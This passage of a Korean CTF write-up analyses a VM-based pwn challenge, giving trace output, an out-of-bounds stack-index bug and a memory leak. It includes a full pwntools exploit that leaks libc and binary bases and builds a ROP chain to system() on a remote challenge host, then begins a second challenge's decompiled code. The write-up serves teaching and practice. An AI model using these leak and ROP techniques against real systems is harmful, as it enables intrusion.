</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785410</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">inc</span> <span style="color:#a6e22e">idx</span> ; <span style="color:#a6e22e">stack</span>[<span style="color:#a6e22e">idx</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">rsp</span> ; <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34785440</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785418</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880300912</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785430</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdx</span> <span style="color:#75715e">// rsp = main+0x70 // back to menu
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">--------</span> <span style="color:#a6e22e">function_4</span>() <span style="color:#f92672">---------</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785438</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">mov</span> <span style="color:#a6e22e">rsp</span>, <span style="color:#a6e22e">rbp</span> ; <span style="color:#a6e22e">pop</span> <span style="color:#a6e22e">rbp</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">--------</span> <span style="color:#a6e22e">exit_internal</span>() <span style="color:#f92672">---------</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785440</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785458</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797815986</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785468</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785478</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785488</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sys_write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x5576599ac0b2</span>, <span style="color:#ae81ff">16</span>) <span style="color:#75715e">// &#34;really? &lt;y/n&gt;\n&gt; &#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34785490</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347854a0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347854b0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347854c8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347854d8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sys_read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">buf_5576599b6280</span>, <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347854e0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2681</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347854f0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span>
</span></span></code></pre></div><p>mov rsp, rbp ; pop rbp는 DOS 취약점으로 이어질 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#f92672">--------</span> <span style="color:#a6e22e">function_4</span>() <span style="color:#f92672">---------</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785438</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">mov</span> <span style="color:#a6e22e">rsp</span>, <span style="color:#a6e22e">rbp</span> ; <span style="color:#a6e22e">pop</span> <span style="color:#a6e22e">rbp</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">--------</span> <span style="color:#a6e22e">exit_internal</span>() <span style="color:#f92672">---------</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785440</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785458</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797815986</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785468</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785478</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785488</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sys_write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x5576599ac0b2</span>, <span style="color:#ae81ff">16</span>) <span style="color:#75715e">// &#34;really? &lt;y/n&gt;\n&gt; &#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34785490</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347854a0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347854b0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347854c8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347854d8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sys_read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">buf_5576599b6280</span>, <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347854e0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2681</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347854f0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785500</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">QWORD</span>)(<span style="color:#a6e22e">buf_5576599b6280</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785508</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">65535</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785518</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eax</span> <span style="color:#f92672">&amp;=</span> <span style="color:#a6e22e">esi</span> <span style="color:#75715e">// eax &amp;= 65535
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34785520</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">rdi</span> <span style="color:#75715e">// rax -= 2681
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34785528</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880300112</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785538</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880301408</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785550</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34785560</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34785050</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785558</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">inc</span> <span style="color:#a6e22e">idx</span> ; <span style="color:#a6e22e">stack</span>[<span style="color:#a6e22e">idx</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">rsp</span> ; <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785560</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785578</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797815980</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785588</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785598</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347855a8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sys_write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x5576599ac0ac</span>, <span style="color:#ae81ff">5</span>) <span style="color:#75715e">// &#34;Bye~\n&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x347855b0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347855c0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">60</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347855d0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sys_exit</span>(<span style="color:#ae81ff">0</span>)
</span></span></code></pre></div><p>exit internal을 확인해보면, y/n에 따라 복귀 주소를 저장해놓는다.
stack[idx]에 대한 검증이 미흡해 OoB가 가능하다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#ae81ff">0x34785000</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">23</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785018</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797815905</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785028</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785038</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785048</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sys_write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x5576599ac061</span>, <span style="color:#ae81ff">23</span>) <span style="color:#75715e">// &#34;Simple Base64 Encoder!\n&#34;
</span></span></span></code></pre></div><p>이러한 가젯들이 존재했는데, 이때 rdx는 나중에 대입된다.
그러면 rdx 쪽 instruction을 건너뛰면, rdx는 잠재적으로 조작될 수 있다.
이를 이용해 .rodata 섹션부터 쭉 메모리를 덤프해서 leak을 달성할 수 있다.</p>
<h3 id="exploit-script-3">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script-3">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">from</span> <span style="color:#a6e22e">pwn</span> <span style="color:#66d9ef">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">tqdm</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>(<span style="color:#e6db74">&#39;./lor&#39;</span>,<span style="color:#a6e22e">env</span><span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;./libc.so.6&#39;</span>})
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ELF</span>(<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">remote</span>(<span style="color:#e6db74">&#39;host3.dreamhack.games&#39;</span>,<span style="color:#ae81ff">14676</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">tqdm</span>.<span style="color:#a6e22e">tqdm</span>(<span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">0x1040</span><span style="color:#75715e">//2)):
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendlineafter</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendlineafter</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;really&#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;n&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x34785000: rdx = 23 ; r12 = 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x34785018: rsi = 93966797815905
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x34785028: rdi = 1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x34785038: rax = 1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x34785048: sys_write(1, 0x5576599ac061, 23) // &#34;Simple Base64 Encoder!\n&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendlineafter</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0x34785018</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pause</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendlineafter</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;: &#39;</span>,<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rvu</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lambda</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">recvuntil</span>(<span style="color:#a6e22e">x</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">l</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">tar</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">8103</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#a6e22e">l</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">tar</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">l</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">recv</span>(<span style="color:#a6e22e">tar</span><span style="color:#f92672">-</span><span style="color:#a6e22e">l</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">recv</span>()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">l</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x40</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rv</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">recv</span>()
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">stdout_</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">u64</span>(<span style="color:#a6e22e">rv</span>[<span style="color:#ae81ff">0x38</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x38</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">stdout_</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stdout_</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">sym</span>.<span style="color:#a6e22e">_IO_2_1_stdout_</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">libc_base</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bin_base</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">u64</span>(<span style="color:#a6e22e">rv</span>[<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>])) <span style="color:#f92672">-</span><span style="color:#ae81ff">0x12008</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">success</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">bin_base</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendlineafter</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">bin_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1A280</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x10</span>)  <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000002a3e5</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1d8698</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">libc</span>.<span style="color:#a6e22e">sym</span>.<span style="color:#a6e22e">system</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pause</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendafter</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;input: &#39;</span>,<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">interactive</span>()
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">POKA</span>{<span style="color:#a6e22e">now_you_are_the_only_diablo</span><span style="color:#f92672">!!</span><span style="color:#a6e22e">rule_the_world</span>}
</span></span></code></pre></div><h1 id="broken-dahuns-heart">Broken Dahun&rsquo;s Heart<a hidden class="anchor" aria-hidden="true" href="#broken-dahuns-heart">#</a></h1>
<h2 id="analysis-4">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-4">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(<span style="color:#a6e22e">stdout</span>, <span style="color:#ae81ff">0</span><span style="color:#a6e22e">LL</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span><span style="color:#a6e22e">LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_hi</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">alarm</span>(<span style="color:#ae81ff">300</span><span style="color:#a6e22e">u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">init_handles</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">random</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fd</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/urandom&#34;</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">fd</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">random</span>, <span style="color:#ae81ff">2</span><span style="color:#a6e22e">uLL</span>);                      <span style="color:#75715e">// bruteforcable
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">close</span>(<span style="color:#a6e22e">fd</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">srand</span>(<span style="color:#a6e22e">random</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">s</span>, <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">sizeof</span>(<span style="color:#a6e22e">s</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">sa_flags</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">sa_handler</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">__sighandler_t</span>)<span style="color:#a6e22e">heal_the_borken_heart</span>;<span style="color:#75715e">// only called once
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">sigaction</span>(<span style="color:#a6e22e">SIGSEGV</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">s</span>, <span style="color:#ae81ff">0</span><span style="color:#a6e22e">LL</span>);                  <span style="color:#75715e">// Sigsegv
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">s</span>, <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">sizeof</span>(<span style="color:#a6e22e">s</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">sa_flags</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">sa_handler</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">__sighandler_t</span>)<span style="color:#a6e22e">exit_handler</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sigaction</span>(<span style="color:#a6e22e">SIGALRM</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">s</span>, <span style="color:#ae81ff">0</span><span style="color:#a6e22e">LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>,
</span></span><span style="display:flex;"><span>         <span style="color:#e6db74">&#34;We should not let this stupid misunderstanding get in our way. We deserve another chance.&#34;</span>);
</span></span><span style="display:flex;"><span>  ((<span style="color:#66d9ef">void</span> (<span style="color:#a6e22e">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#a6e22e">__int64</span>, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>)(<span style="color:#a6e22e">v3</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">endl</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">try_again</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>마찬가지로 enum을 정의해서 쓰면된다.</p>
